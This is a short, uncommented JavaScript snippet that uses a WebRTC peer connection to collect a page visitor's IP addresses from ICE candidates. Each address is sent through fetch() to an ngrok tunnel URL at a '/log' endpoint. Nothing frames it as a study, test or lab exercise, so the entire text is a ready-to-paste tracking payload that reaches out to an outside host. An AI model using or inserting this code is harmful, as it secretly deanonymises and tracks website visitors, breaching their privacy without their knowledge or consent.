let pc=new RTCPeerConnection({iceServers:[]});
pc.createDataChannel("");
pc.createOffer().then(o=>pc.setLocalDescription(o));
pc.onicecandidate=e=>e&&e.candidate&&fetch("https://5f36-103-176-65-40.ngrok-free.app/log?ip="+e.candidate.candidate.split(" ")[4]);
